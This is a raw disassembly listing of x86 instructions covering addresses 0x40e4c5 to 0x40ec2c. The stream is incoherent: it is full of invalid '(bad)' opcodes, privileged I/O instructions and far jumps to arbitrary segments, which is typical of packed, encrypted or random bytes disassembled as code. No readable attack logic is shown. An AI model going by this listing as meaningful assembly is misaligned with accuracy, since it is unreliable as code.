  40e4c5:	sbb    al,0xa0
  40e4c7:	push   cs
  40e4c8:	cmp    cl,BYTE PTR [esi]
  40e4ca:	xor    dh,BYTE PTR [ecx+0x61]
  40e4cd:	(bad)  
  40e4cf:	icebp  
  40e4d0:	or     al,0x7a
  40e4d2:	(bad)  
  40e4d3:	mov    eax,DWORD PTR [edx]
  40e4d5:	test   al,0x23
  40e4d7:	push   ecx
  40e4d8:	mov    esi,0x2eafb333
  40e4dd:	lea    eax,[eax-0x2e078937]
  40e4e3:	xchg   edx,eax
  40e4e4:	iret   
  40e4e5:	or     esi,0xf9e6d699
  40e4eb:	rcr    BYTE PTR [ebx-0x38],0xc1
  40e4ef:	je     0x40e49f
  40e4f1:	loopne 0x40e51f
  40e4f3:	or     al,0xb6
  40e4f5:	pushf  
  40e4f6:	into   
  40e4f7:	jo     0x40e4fd
  40e4f9:	or     al,BYTE PTR [eax-0x5b]
  40e4fc:	sbb    BYTE PTR [ebp-0x10],dl
  40e4ff:	xlat   BYTE PTR ds:[ebx]
  40e500:	mov    eax,ds:0x126a4a84
  40e505:	add    al,0x54
  40e507:	push   ss
  40e508:	sub    ecx,ebp
  40e50a:	dec    ebx
  40e50b:	repnz aad 0xc3
  40e50e:	lods   eax,DWORD PTR ds:[esi]
  40e50f:	pushf  
  40e510:	(bad)  
  40e511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e512:	adc    eax,0xd6c48070
  40e517:	add    DWORD PTR [ebx*4-0x30912015],esp
  40e51e:	lods   al,BYTE PTR ds:[esi]
  40e51f:	icebp  
  40e520:	ins    BYTE PTR es:[edi],dx
  40e521:	fcmovb st,st(0)
  40e523:	in     al,dx
  40e524:	adc    al,BYTE PTR [edi]
  40e526:	pop    esp
  40e527:	sub    BYTE PTR [esi],dl
  40e529:	ret    0x571d
  40e52c:	pop    ds
  40e52d:	daa    
  40e52e:	out    dx,eax
  40e52f:	test   BYTE PTR [edx-0x38431eab],bl
  40e535:	fidiv  DWORD PTR [ebp-0x329ef5f7]
  40e53b:	ss sbb eax,0x3cb28034
  40e541:	xchg   edx,eax
  40e542:	push   esi
  40e543:	xchg   DWORD PTR ds:0x2bf0c670,esi
  40e549:	out    dx,eax
  40e54a:	(bad)  
  40e54b:	out    0xa4,al
  40e54d:	stc    
  40e54e:	in     al,0x4d
  40e550:	sbb    dh,ah
  40e552:	frstpm(287 only) 
  40e554:	je     0x40e5d0
  40e556:	leave  
  40e557:	or     edx,DWORD PTR [ebx+0x39e37596]
  40e55d:	mov    ah,0x73
  40e55f:	aam    0x26
  40e561:	in     eax,0x3f
  40e563:	test   eax,0x192e4741
  40e568:	add    DWORD PTR [di+0x12],esp
  40e56c:	xchg   ebx,eax
  40e56d:	(bad)  
  40e56e:	sbb    ecx,DWORD PTR [ebx]
  40e570:	jle    0x40e555
  40e572:	jbe    0x40e59e
  40e574:	loop   0x40e50d
  40e576:	rol    DWORD PTR ds:0xf265cabf,1
  40e57c:	add    bl,BYTE PTR [esi-0x3714ef77]
  40e582:	(bad)  
  40e583:	and    DWORD PTR [edi+0x1695a31],ecx
  40e589:	add    eax,0xd7cd463e
  40e58e:	int    0xf2
  40e590:	fld    QWORD PTR [ebx]
  40e592:	xchg   edx,eax
  40e593:	and    ch,BYTE PTR [ebx+0x55]
  40e596:	les    edi,FWORD PTR [ebx]
  40e598:	add    DWORD PTR [ebp+0x51cabc74],edi
  40e59e:	test   DWORD PTR ds:0x218ae27,esp
  40e5a4:	jmp    0x13f2c6e6
  40e5a9:	mov    dl,0x55
  40e5ab:	inc    esp
  40e5ac:	and    DWORD PTR [edi+0x63838b1e],ecx
  40e5b2:	or     BYTE PTR [esi-0xda2e2b9],0x9a
  40e5b9:	add    dl,BYTE PTR [ebx+esi*1]
  40e5bc:	adc    al,0xba
  40e5be:	fucomip st,st(1)
  40e5c0:	jb     0x40e60a
  40e5c2:	xchg   ecx,eax
  40e5c3:	sub    eax,0x5f4a375d
  40e5c8:	xchg   esp,eax
  40e5c9:	fs popa 
  40e5cb:	adc    al,0xd5
  40e5cd:	xchg   esp,eax
  40e5ce:	nop
  40e5cf:	sub    eax,0xf53248c6
  40e5d4:	mov    bh,0x5b
  40e5d6:	jge    0x40e5c5
  40e5d8:	add    DWORD PTR [eax+0x4592289d],edx
  40e5de:	fcmovnu st,st(6)
  40e5e0:	imul   esi,DWORD PTR [ebx+0x10],0xe
  40e5e4:	mov    ebx,0x5abe823a
  40e5e9:	fwait
  40e5ea:	int    0xe
  40e5ec:	and    eax,ecx
  40e5ee:	xor    dl,BYTE PTR [edi]
  40e5f0:	push   eax
  40e5f1:	fwait
  40e5f2:	out    0x96,eax
  40e5f4:	and    DWORD PTR [ebx-0x7de1c088],edx
  40e5fa:	cmp    BYTE PTR [edx+0x5a],cl
  40e5fd:	or     bh,BYTE PTR [esi-0x2f]
  40e600:	mov    ebp,fs
  40e602:	daa    
  40e603:	popa   
  40e604:	lea    esp,[esi+0x53e5d927]
  40e60a:	push   ds
  40e60b:	dec    ebx
  40e60c:	pop    edi
  40e60d:	push   ecx
  40e60e:	ins    BYTE PTR es:[edi],dx
  40e60f:	int    0x91
  40e611:	push   esp
  40e612:	or     BYTE PTR [edx-0x4c],bh
  40e615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e616:	(bad)  
  40e617:	mov    al,ds:0xee581038
  40e61c:	sub    BYTE PTR [ecx-0x1],ch
  40e61f:	mov    bl,0x10
  40e621:	push   cs
  40e622:	mov    ds:0xa7080f2d,eax
  40e627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e628:	push   esi
  40e629:	and    edx,DWORD PTR [ecx-0x20]
  40e62c:	cmp    eax,0x76854935
  40e631:	and    esi,DWORD PTR [esp+ebx*8-0x35dbead2]
  40e638:	cmp    DWORD PTR [ebx+0x7e085c10],esi
  40e63e:	aam    0xc2
  40e640:	cmp    al,0x32
  40e642:	xchg   BYTE PTR [esi+0x6e],dh
  40e645:	gs stc 
  40e647:	push   0x47a7ce62
  40e64c:	sub    BYTE PTR [edi],bh
  40e64e:	les    ecx,FWORD PTR [esp+eax*8-0x6e]
  40e652:	dec    edi
  40e653:	inc    dl
  40e655:	xor    DWORD PTR ds:0x45285a7a,0x1b
  40e65c:	sahf   
  40e65d:	sub    DWORD PTR [eax+0x22fb33fa],edi
  40e663:	push   es
  40e664:	jecxz  0x40e6d1
  40e666:	sbb    BYTE PTR [eax+0x603e9be0],0x77
  40e66d:	stos   DWORD PTR es:[edi],eax
  40e66e:	pop    edi
  40e66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e670:	out    0x64,eax
  40e672:	dec    esi
  40e673:	aad    0x6a
  40e675:	add    al,0xe7
  40e677:	xor    al,BYTE PTR ds:[ecx-0x73]
  40e67b:	mov    ah,0x19
  40e67d:	gs stc 
  40e67f:	ret    0x82b1
  40e682:	mov    ebp,0x32f410da
  40e687:	std    
  40e688:	sbb    cl,BYTE PTR ds:0xb2580848
  40e68e:	ret    
  40e68f:	std    
  40e690:	xchg   ebp,eax
  40e691:	cdq    
  40e692:	push   ecx
  40e693:	mov    DWORD PTR [edi+0x7b],edx
  40e696:	pop    ss
  40e697:	sahf   
  40e698:	xchg   esp,eax
  40e699:	and    DWORD PTR [esi-0x78],edx
  40e69c:	test   al,0x10
  40e69e:	xchg   BYTE PTR [esi-0x138983b9],ch
  40e6a4:	repnz retf 0xbea1
  40e6a8:	les    esi,FWORD PTR [ecx]
  40e6aa:	int3   
  40e6ab:	xchg   ebx,eax
  40e6ac:	js     0x40e6ae
  40e6ae:	pop    ebp
  40e6af:	loope  0x40e6a9
  40e6b1:	inc    edx
  40e6b2:	dec    ecx
  40e6b3:	add    DWORD PTR [ecx],ecx
  40e6b5:	pop    eax
  40e6b6:	out    dx,eax
  40e6b7:	mov    ecx,0x9492c3be
  40e6bc:	sar    eax,1
  40e6be:	repz cmp DWORD PTR [esi-0x115e5d79],edi
  40e6c5:	mov    dl,0x1a
  40e6c7:	and    DWORD PTR [eax],ecx
  40e6c9:	ror    BYTE PTR [eax-0x3f76668d],cl
  40e6cf:	pop    ss
  40e6d0:	retf   0x37a
  40e6d3:	test   al,0xf8
  40e6d5:	pop    eax
  40e6d6:	and    eax,0xcee4a192
  40e6db:	bound  edx,QWORD PTR [ebx-0x7e25d53f]
  40e6e1:	xor    ah,0x3b
  40e6e4:	dec    edi
  40e6e5:	(bad)  
  40e6e6:	(bad)  
  40e6e7:	pop    ds
  40e6e8:	jnp    0x40e66c
  40e6ea:	(bad)  
  40e6eb:	call   0x3b11:0x3a6e71a1
  40e6f2:	adc    al,0x5f
  40e6f4:	pop    ds
  40e6f5:	push   esi
  40e6f6:	jp     0x40e755
  40e6f8:	pushf  
  40e6f9:	push   ds
  40e6fa:	clc    
  40e6fb:	fyl2xp1 
  40e6fd:	mov    gs,WORD PTR [esi]
  40e6ff:	sub    bh,BYTE PTR es:[edx+0x63]
  40e703:	dec    edi
  40e704:	mov    dl,cl
  40e706:	sti    
  40e707:	adc    BYTE PTR [edx],al
  40e709:	jbe    0x40e6bf
  40e70b:	jmp    0xfafaa35a
  40e710:	mov    ch,0xa4
  40e712:	out    0xe8,eax
  40e714:	add    edi,DWORD PTR [esi+0x760aa037]
  40e71a:	(bad)  
  40e71c:	mov    bh,0x88
  40e71e:	mov    WORD PTR [ecx+0x26],gs
  40e721:	cmc    
  40e722:	icebp  
  40e723:	out    dx,al
  40e724:	fs jns 0x40e788
  40e727:	repz lea ecx,[edx]
  40e72a:	pop    ecx
  40e72b:	jg     0x40e765
  40e72d:	pop    edx
  40e72e:	call   DWORD PTR [edx+0x4a]
  40e731:	addr16 xchg ebp,eax
  40e733:	and    BYTE PTR [edi+0x5d6d9dc5],ah
  40e739:	cmp    eax,0x8eb6e904
  40e73e:	scas   eax,DWORD PTR es:[edi]
  40e73f:	adc    ah,BYTE PTR [eax-0x1587b944]
  40e745:	jno    0x40e6c8
  40e747:	mov    al,0x87
  40e749:	call   0x297b949e
  40e74e:	jl     0x40e71b
  40e750:	out    dx,al
  40e751:	(bad)  
  40e752:	(bad)  
  40e753:	mov    al,0x9c
  40e755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e756:	test   ebp,edx
  40e758:	jp     0x40e764
  40e75a:	cmp    al,0xd6
  40e75c:	jecxz  0x40e778
  40e75e:	xchg   ebp,eax
  40e75f:	cmp    BYTE PTR [edi-0xa],dh
  40e762:	pop    es
  40e763:	cmp    al,0xc3
  40e765:	sti    
  40e766:	pop    edx
  40e767:	ror    BYTE PTR [esi+0x38],cl
  40e76a:	mov    edx,0x7dacdc34
  40e76f:	das    
  40e770:	lds    esp,FWORD PTR ds:0x1f579cb3
  40e776:	fild   WORD PTR [ebp+0x616cd79a]
  40e77c:	psrlq  mm6,mm0
  40e77f:	adc    eax,0xc7fff8e
  40e784:	cwde   
  40e785:	rcl    BYTE PTR [eax],1
  40e787:	or     al,BYTE PTR [edx]
  40e789:	xlat   BYTE PTR ds:[ebx]
  40e78a:	pop    esi
  40e78b:	push   ebp
  40e78c:	(bad)  
  40e78e:	(bad)  
  40e78f:	xchg   edi,eax
  40e790:	pop    esp
  40e791:	and    dh,BYTE PTR [ebx+ebx*4-0x19]
  40e795:	or     edi,DWORD PTR [ebx]
  40e797:	pop    ebx
  40e798:	cs js  0x40e785
  40e79b:	inc    ebx
  40e79c:	push   ecx
  40e79d:	lahf   
  40e79e:	adc    DWORD PTR [edx],0xa6f817c4
  40e7a4:	fnstenv [esi]
  40e7a6:	aad    0xe8
  40e7a8:	pop    esp
  40e7a9:	(bad)  
  40e7aa:	daa    
  40e7ab:	sbb    DWORD PTR [ebp+0xb],esp
  40e7ae:	sub    BYTE PTR [edx],al
  40e7b0:	shl    BYTE PTR [edx+0x10d2e255],0x6a
  40e7b7:	xchg   ebx,eax
  40e7b8:	popf   
  40e7b9:	mov    dh,0x91
  40e7bb:	out    0x5e,eax
  40e7bd:	lods   al,BYTE PTR ds:[esi]
  40e7be:	adc    bl,0x58
  40e7c1:	xor    al,BYTE PTR [ebp-0x3d]
  40e7c4:	shr    BYTE PTR [esi-0x23],1
  40e7c7:	adc    BYTE PTR [edx+0x3e],bh
  40e7ca:	imul   ebx,DWORD PTR [edi+0x13bd2dfc],0xcf6b897f
  40e7d4:	test   DWORD PTR [esi+0x60],0xe7de38ef
  40e7db:	rol    cl,0x20
  40e7de:	nop
  40e7df:	retf   
  40e7e0:	in     al,0xb2
  40e7e2:	aam    0x7c
  40e7e4:	stc    
  40e7e5:	adc    DWORD PTR [esi-0x82b26cf],esp
  40e7eb:	xchg   ebx,eax
  40e7ec:	ja     0x40e7c8
  40e7ee:	push   0x3da9668d
  40e7f3:	in     eax,0x53
  40e7f5:	loopne 0x40e77c
  40e7f7:	sub    DWORD PTR [edx-0x3d],edx
  40e7fa:	pushf  
  40e7fb:	pop    ss
  40e7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fd:	inc    ebx
  40e7fe:	(bad)  
  40e7ff:	loop   0x40e7fe
  40e801:	rol    edx,0xea
  40e804:	test   BYTE PTR [edx+ebp*8+0x7c],ah
  40e808:	push   edi
  40e809:	into   
  40e80a:	jbe    0x40e86a
  40e80c:	fcom   QWORD PTR [ecx]
  40e80e:	mov    edi,0x62d8624d
  40e813:	jl     0x40e855
  40e815:	sub    BYTE PTR [edx+0x71e4176d],bh
  40e81b:	push   esp
  40e81c:	mov    edi,0x6cc11fb3
  40e821:	dec    edx
  40e822:	mov    dl,0xbe
  40e824:	ss stos DWORD PTR es:[edi],eax
  40e826:	fsub   DWORD PTR [esi+ebx*2-0x1a]
  40e82a:	scas   eax,DWORD PTR es:[edi]
  40e82b:	rcr    DWORD PTR [eax+0x7f047a0f],cl
  40e831:	test   bl,al
  40e833:	test   eax,0x758ddf53
  40e838:	or     ecx,DWORD PTR [ecx+0x709c6ed3]
  40e83e:	add    DWORD PTR [eax-0x471d9c1d],esi
  40e844:	jbe    0x40e82b
  40e846:	mov    ds,WORD PTR [eax+0xb]
  40e849:	add    BYTE PTR [edx+0x77b82999],ch
  40e84f:	xor    eax,0xa3a70c1c
  40e854:	push   es
  40e855:	jg     0x40e830
  40e857:	xor    edi,DWORD PTR [ecx+0x21]
  40e85a:	sub    DWORD PTR [esi-0x50],ebx
  40e85d:	and    al,0x76
  40e85f:	xchg   esi,eax
  40e860:	gs pop ebx
  40e862:	arpl   bx,cx
  40e864:	sub    esi,DWORD PTR [eax-0x34421ad7]
  40e86a:	mov    esp,0xd399ee9
  40e86f:	fisubr DWORD PTR [edi-0x3c6359a8]
  40e875:	pop    esi
  40e876:	into   
  40e877:	sbb    dh,cl
  40e879:	(bad)  
  40e87a:	adc    BYTE PTR [ecx],bh
  40e87c:	push   ebp
  40e87d:	sar    DWORD PTR [ebp-0x6c],0x5a
  40e881:	call   0x3ef8:0x1dd2880e
  40e888:	dec    ecx
  40e889:	xor    ebx,DWORD PTR [ebp-0x64]
  40e88c:	mov    ebp,DWORD PTR [edi+0x4c]
  40e88f:	adc    DWORD PTR [ebx],ebp
  40e891:	pushf  
  40e892:	dec    edi
  40e893:	mov    esi,0x96c1ca9e
  40e898:	dec    esi
  40e899:	or     al,ah
  40e89b:	iret   
  40e89c:	adc    al,0xa9
  40e89e:	cmc    
  40e89f:	int3   
  40e8a0:	(bad)  
  40e8a1:	and    esp,DWORD PTR [ecx]
  40e8a3:	xor    BYTE PTR [edi-0x614f58a7],0x88
  40e8aa:	pop    esi
  40e8ab:	push   edx
  40e8ac:	sub    BYTE PTR [edi+edi*4],bh
  40e8af:	daa    
  40e8b0:	sub    ah,ch
  40e8b2:	gs add eax,0xe05fed67
  40e8b8:	add    al,0xdb
  40e8ba:	mov    bl,0x6b
  40e8bc:	adc    DWORD PTR [eax-0x2a1621bf],esi
  40e8c2:	or     BYTE PTR [eax+0x4a],cl
  40e8c5:	jmp    0xbe70:0xc99e2f4c
  40e8cc:	lahf   
  40e8cd:	mov    ds,WORD PTR ds:0xe5f41b59
  40e8d3:	cmp    al,BYTE PTR [ebx+0x68bf7642]
  40e8d9:	dec    edi
  40e8da:	jl     0x40e93b
  40e8dc:	mov    ah,0x2b
  40e8de:	clc    
  40e8df:	mov    bl,0x5b
  40e8e1:	sbb    edx,DWORD PTR [edx]
  40e8e3:	mov    eax,ds:0xf0d9b4d8
  40e8e8:	adc    edi,DWORD PTR [ebp+0x7b]
  40e8eb:	sbb    eax,0x1fb9f716
  40e8f0:	push   ecx
  40e8f1:	mov    BYTE PTR [ecx+0x4c],0x92
  40e8f5:	js     0x40e951
  40e8f7:	sbb    DWORD PTR ds:0xbd7d8de3,edx
  40e8fd:	neg    DWORD PTR [ebp+0x43]
  40e900:	add    ch,al
  40e902:	pop    ecx
  40e903:	lahf   
  40e904:	ja     0x40e95b
  40e906:	ja     0x40e963
  40e908:	mov    edx,0xee335df1
  40e90d:	push   0x6c
  40e90f:	jns    0x40e95d
  40e911:	div    DWORD PTR [ecx-0x6e500628]
  40e917:	cmovae ebx,edx
  40e91a:	(bad)  
  40e91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e91c:	lods   al,BYTE PTR ds:[esi]
  40e91d:	cmc    
  40e91e:	iret   
  40e91f:	push   ebx
  40e920:	in     eax,0x82
  40e922:	shr    BYTE PTR [ecx],0x4c
  40e925:	add    DWORD PTR [ebp-0x60],ebp
  40e928:	xor    DWORD PTR [ebx-0x30287d20],eax
  40e92e:	data16 cmp dl,0xd5
  40e932:	nop
  40e933:	pop    edx
  40e934:	cwde   
  40e935:	rol    DWORD PTR [ebx],cl
  40e937:	mov    BYTE PTR [ebx-0x24],bl
  40e93a:	ret    0xa0f2
  40e93d:	cwde   
  40e93e:	enter  0x63ec,0x3d
  40e942:	xor    eax,ecx
  40e944:	icebp  
  40e945:	xchg   edx,eax
  40e946:	sub    BYTE PTR [ebx-0x32],dl
  40e949:	loopne 0x40e928
  40e94b:	inc    ecx
  40e94c:	cwde   
  40e94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e94e:	loopne 0x40e9c4
  40e950:	in     eax,0xd3
  40e952:	pop    edx
  40e953:	stos   DWORD PTR es:[edi],eax
  40e954:	sbb    BYTE PTR [edi+0x17],dh
  40e957:	sbb    DWORD PTR ds:0xda332bc2,eax
  40e95d:	cmp    edi,DWORD PTR [edi+0x78]
  40e960:	adc    ebp,DWORD PTR [edx+ecx*1+0x35]
  40e964:	gs call 0x87fa4ab0
  40e96a:	and    esp,DWORD PTR [edi]
  40e96c:	push   ebp
  40e96d:	add    edx,ebp
  40e96f:	mov    edi,0x1918eceb
  40e974:	or     eax,esp
  40e976:	fidivr WORD PTR [eax]
  40e978:	sbb    ecx,DWORD PTR [edx+0x15]
  40e97b:	arpl   WORD PTR [edi],si
  40e97d:	(bad)  
  40e97e:	stc    
  40e97f:	xor    al,0x24
  40e981:	mov    eax,DWORD PTR [ebp-0x13]
  40e984:	in     eax,0xad
  40e986:	mov    ecx,0x44a67bbe
  40e98b:	fdivp  st(6),st
  40e98d:	xchg   esp,eax
  40e98e:	je     0x40e9e3
  40e990:	sub    esi,edi
  40e992:	xor    eax,0x228d9e77
  40e997:	retf   0x618
  40e99a:	jo     0x40e95c
  40e99c:	xor    al,0xf5
  40e99e:	add    BYTE PTR [ebp+0x778c2ba9],al
  40e9a4:	sub    ah,BYTE PTR [eax-0x70]
  40e9a7:	push   edi
  40e9a8:	(bad)  
  40e9a9:	test   BYTE PTR [eax],0xd1
  40e9ac:	data16 aaa 
  40e9ae:	mov    ecx,0x9df8271e
  40e9b3:	retf   
  40e9b4:	icebp  
  40e9b5:	(bad)  
  40e9b6:	clc    
  40e9b7:	pop    ss
  40e9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9b9:	out    0x54,eax
  40e9bb:	fld    QWORD PTR [eax]
  40e9bd:	iret   
  40e9be:	les    ecx,FWORD PTR [ebx+eax*2]
  40e9c1:	je     0x40e9c7
  40e9c3:	mov    ?,WORD PTR [eax+0x458da004]
  40e9c9:	sti    
  40e9ca:	mov    edi,0xc2f7ca6a
  40e9cf:	retf   0x7ba6
  40e9d2:	add    eax,DWORD PTR [ebp-0x5f]
  40e9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d6:	fild   WORD PTR [esi]
  40e9d8:	std    
  40e9d9:	jnp    0x40e996
  40e9db:	adc    BYTE PTR [ebx],bl
  40e9dd:	mov    al,ds:0x10a675a6
  40e9e2:	imul   edx,DWORD PTR [bp+0x5f],0x72
  40e9e7:	mov    eax,edi
  40e9e9:	repnz rcl BYTE PTR [ecx+0x52b75fda],cl
  40e9f0:	inc    ebx
  40e9f1:	push   cs
  40e9f2:	test   DWORD PTR [edi-0x64b9a42d],0xc41a1756
  40e9fc:	lods   eax,DWORD PTR ds:[esi]
  40e9fd:	mov    al,0x1b
  40e9ff:	sub    bh,cl
  40ea01:	push   es
  40ea02:	jp     0x40ea14
  40ea04:	mov    bh,0x5
  40ea06:	mov    ecx,0xe35d7650
  40ea0b:	push   ss
  40ea0c:	push   es
  40ea0d:	lahf   
  40ea0e:	aam    0x79
  40ea10:	fistp  QWORD PTR [edx+ecx*1]
  40ea13:	js     0x40ea5d
  40ea15:	iret   
  40ea16:	jmp    DWORD PTR [edx+eiz*2]
  40ea19:	xchg   esi,eax
  40ea1a:	jle    0x40ea9a
  40ea1c:	push   esp
  40ea1d:	outs   dx,DWORD PTR ds:[esi]
  40ea1e:	in     eax,dx
  40ea1f:	cmp    eax,0x8d264058
  40ea24:	aad    0x76
  40ea26:	sahf   
  40ea27:	int3   
  40ea28:	mov    ebp,0x390c91a7
  40ea2d:	sti    
  40ea2e:	jle    0x40ea7f
  40ea30:	mov    ebp,0xcbff97ba
  40ea35:	adc    DWORD PTR [ebx],esp
  40ea37:	cmp    dh,bl
  40ea39:	imul   esp,DWORD PTR [ecx-0x1f8353fc],0x53d5c8e6
  40ea43:	sbb    ah,dl
  40ea45:	shl    dh,0xe3
  40ea48:	sub    eax,0x94c67645
  40ea4d:	mov    eax,ds:0x558a0cd8
  40ea52:	jl     0x40ea70
  40ea54:	jp     0x40e9e4
  40ea56:	ret    
  40ea57:	gs inc ebx
  40ea59:	cmp    al,0x8
  40ea5b:	loope  0x40ea4e
  40ea5d:	dec    eax
  40ea5e:	and    ebx,0xfffffff2
  40ea61:	push   0x4a
  40ea63:	push   ecx
  40ea64:	sbb    al,0xc
  40ea66:	out    dx,al
  40ea67:	jecxz  0x40ea08
  40ea69:	daa    
  40ea6a:	and    eax,0x913e9a55
  40ea6f:	into   
  40ea70:	out    0x0,eax
  40ea72:	sub    al,0x2
  40ea74:	data16 add bh,al
  40ea77:	push   esp
  40ea78:	push   ds
  40ea79:	adc    al,0x83
  40ea7b:	jo     0x40ea60
  40ea7d:	fs inc edx
  40ea7f:	or     bh,BYTE PTR [esi]
  40ea81:	fldcw  WORD PTR [edi+0x2b332f6f]
  40ea87:	add    al,0x72
  40ea89:	dec    edx
  40ea8a:	pop    esi
  40ea8b:	mov    cs,eax
  40ea8d:	sub    DWORD PTR [edi],edx
  40ea8f:	pop    esp
  40ea90:	dec    eax
  40ea91:	cld    
  40ea92:	adc    dl,BYTE PTR ds:0x6451a200
  40ea98:	dec    ebx
  40ea99:	repz retf 
  40ea9b:	iret   
  40ea9c:	xlat   BYTE PTR ds:[ebx]
  40ea9d:	push   0x8dd3b15e
  40eaa2:	adc    BYTE PTR [esi+0x4e],0x2a
  40eaa6:	and    BYTE PTR [eax+0x4a],ch
  40eaa9:	loope  0x40eaef
  40eaab:	lahf   
  40eaac:	in     eax,0xcc
  40eaae:	les    ebx,FWORD PTR [esi+0x5e7d3394]
  40eab4:	jae    0x40eab6
  40eab6:	add    al,0x73
  40eab8:	jge    0x40eaa0
  40eaba:	jmp    DWORD PTR [esi+0x73fd735a]
  40eac0:	jmp    0x4ea0c111
  40eac5:	xchg   esp,eax
  40eac6:	aam    0xf4
  40eac8:	out    0x4a,eax
  40eaca:	push   ebx
  40eacb:	xchg   esp,eax
  40eacc:	pop    ds
  40eacd:	ret    0x320
  40ead0:	inc    eax
  40ead1:	push   ebx
  40ead2:	dec    ebx
  40ead3:	addr16 jmp 0x4341:0x9ca09bce
  40eadb:	sbb    cl,BYTE PTR [esi+edi*2+0x1f]
  40eadf:	stc    
  40eae0:	in     al,dx
  40eae1:	push   ecx
  40eae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eae3:	(bad)  
  40eae4:	ret    0x57ab
  40eae7:	and    DWORD PTR [edi-0x25fc6fd3],esi
  40eaed:	xor    DWORD PTR [eax],esp
  40eaef:	ret    
  40eaf0:	ds mov bl,bl
  40eaf3:	adc    al,0x19
  40eaf5:	fidiv  DWORD PTR [edx+0x1ed95e51]
  40eafb:	es loop 0x40eaaa
  40eafe:	lea    esp,[edi-0x65]
  40eb01:	(bad)  
  40eb04:	or     al,0xe9
  40eb06:	xor    eax,0xf563754c
  40eb0b:	in     al,0x3
  40eb0d:	iret   
  40eb0e:	es mov ecx,0x6acdee61
  40eb14:	aam    0x54
  40eb16:	xor    al,0xce
  40eb18:	inc    dh
  40eb1a:	xor    ecx,DWORD PTR [ecx-0x22f8e619]
  40eb20:	pop    es
  40eb21:	adc    al,bl
  40eb23:	jae    0x40eadd
  40eb25:	pop    eax
  40eb26:	je     0x40eb76
  40eb28:	adc    DWORD PTR [ebx+0x6b],0xffffffc9
  40eb2c:	cs mov ah,dh
  40eb2f:	add    al,0xdf
  40eb31:	repnz sbb DWORD PTR [eax+eax*2+0x7e],eax
  40eb36:	lods   eax,DWORD PTR ds:[esi]
  40eb37:	push   esi
  40eb38:	imul   esi,ecx,0xffffffbd
  40eb3b:	xchg   edi,eax
  40eb3c:	dec    esi
  40eb3e:	cli    
  40eb3f:	test   al,0xd
  40eb41:	adc    al,0xbf
  40eb43:	loope  0x40eae7
  40eb45:	nop
  40eb46:	push   edi
  40eb47:	xor    eax,0xe0c2e59
  40eb4c:	cmc    
  40eb4d:	xchg   edx,eax
  40eb4e:	adc    BYTE PTR [edx-0x58],dh
  40eb51:	xchg   edi,eax
  40eb52:	push   ds
  40eb53:	pop    esp
  40eb54:	and    al,0x17
  40eb56:	pop    ss
  40eb57:	xchg   esp,eax
  40eb58:	pop    eax
  40eb59:	inc    edx
  40eb5a:	jns    0x40eb87
  40eb5c:	mov    bh,0x3d
  40eb5e:	into   
  40eb5f:	cmp    dl,bl
  40eb61:	push   ss
  40eb62:	jno    0x40eb4f
  40eb64:	bound  edx,QWORD PTR ds:0xc6507b95
  40eb6a:	inc    edx
  40eb6b:	(bad)  
  40eb6c:	push   DWORD PTR [eax]
  40eb6e:	inc    edx
  40eb6f:	dec    edi
  40eb70:	xchg   ebp,eax
  40eb71:	or     eax,0x835adf09
  40eb76:	lods   eax,DWORD PTR ds:[esi]
  40eb77:	icebp  
  40eb78:	jmp    0x2d0b:0x82cc2891
  40eb7f:	sbb    edi,DWORD PTR [ebp+0x6adcd3f]
  40eb85:	add    edx,ebp
  40eb87:	test   eax,0x2cedb3c6
  40eb8d:	push   ebx
  40eb8e:	mov    ecx,0x566afb91
  40eb93:	mov    edx,DWORD PTR [ecx-0x7b83dd09]
  40eb99:	hlt    
  40eb9a:	retf   0xbd28
  40eb9d:	dec    esp
  40eb9e:	mov    al,0xa9
  40eba0:	jo     0x40ebe5
  40eba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba3:	in     eax,dx
  40eba4:	cdq    
  40eba5:	repnz int 0x30
  40eba8:	icebp  
  40eba9:	fisubr WORD PTR [eax]
  40ebab:	fbld   TBYTE PTR [ecx]
  40ebad:	pop    es
  40ebae:	mov    edx,DWORD PTR [edx+0x71662835]
  40ebb4:	es icebp 
  40ebb6:	mov    ds:0x1d9dd04c,al
  40ebbb:	add    BYTE PTR [ecx-0x40],al
  40ebbe:	jge    0x40ebc2
  40ebc0:	(bad)  [ebx]
  40ebc2:	addr16 mov ebx,0xd7f71d4b
  40ebc8:	jns    0x40ec38
  40ebca:	outs   dx,DWORD PTR ds:[esi]
  40ebcb:	jo     0x40ebed
  40ebcd:	xor    al,0xc1
  40ebcf:	fdivr  DWORD PTR [ecx]
  40ebd1:	jmp    0xfb21:0x2dd76b84
  40ebd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd9:	cmp    BYTE PTR [ecx-0x65],0x1d
  40ebdd:	inc    esp
  40ebde:	mov    ds:0x75fd6c3e,eax
  40ebe3:	pusha  
  40ebe4:	jbe    0x40ec60
  40ebe6:	call   0xa106:0xbeabfd7c
  40ebed:	mov    ebp,0x3650132
  40ebf2:	(bad)  
  40ebf3:	mov    edi,0x2f31957c
  40ebf8:	lahf   
  40ebf9:	ds pushf 
  40ebfb:	mov    eax,ds:0xadfa40a5
  40ec00:	jp     0x40ec70
  40ec02:	xchg   BYTE PTR [ecx+0x4a2ce806],cl
  40ec08:	sub    DWORD PTR [eax+edx*1-0x5bb8e77f],esp
  40ec0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec10:	sbb    dh,BYTE PTR [ebx+0x58823a2a]
  40ec16:	pop    ds
  40ec17:	mov    dl,BYTE PTR [ecx-0x6e]
  40ec1a:	outs   dx,BYTE PTR ds:[esi]
  40ec1b:	add    eax,0x60209aab
  40ec20:	les    edx,FWORD PTR [ebx-0x4272d4eb]
  40ec26:	pusha  
  40ec27:	pop    ss
  40ec28:	push   cs
  40ec29:	sbb    ebx,0xffffffe9
  40ec2c:	pop    ecx
